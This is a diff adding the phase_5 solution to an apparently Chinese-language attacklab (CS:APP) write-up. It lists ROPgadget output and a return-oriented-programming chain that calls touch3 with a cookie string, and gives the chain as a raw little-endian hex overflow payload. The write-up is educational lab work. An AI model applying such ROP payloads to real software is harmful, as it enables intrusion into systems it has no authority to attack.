@@ -153,7 +153,45 @@ fa 97 b9 59 00 00 00 00 ec 17 40 00 00 00 00 00
 ```
 ![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image9.png)
 
+##phase_5
+同phase_3的题目一样的要求，不过这次栈地址随机化弄得很难受
+不过用ROPgadget看了一下有惊喜
+```
+0x0000000000401383 : pop rsi ; ret
+0x0000000000401a06 : mov rax, rsp ; ret
+0x00000000004019a2 : mov rdi, rax ; ret
+0x00000000004019d6 : lea rax, [rdi + rsi] ; ret
+```
+可以用这几个gadget构造ROP链
+```
+pop rsi ; ret
+0x20
+mov rax, rsp ; ret
+mov rdi, rax ; ret
+lea rax, [rdi + rsi] ; ret
+mov rdi, rax ; ret
+touch3_addr
+cookie_string
+```
+转换成16进制小端存储
+```
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+83 13 40 00 00 00 00 00
+20 00 00 00 00 00 00 00
+06 1a 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+d6 19 40 00 00 00 00 00
+a2 19 40 00 00 00 00 00
+fa 18 40 00 00 00 00 00
+35 39 62 39 39 37 66 61
+```
+完成本题
 
+![avatar](https://github.com/AmaIIl/attacklab/blob/gh-pages/image10.png)
 
 
 
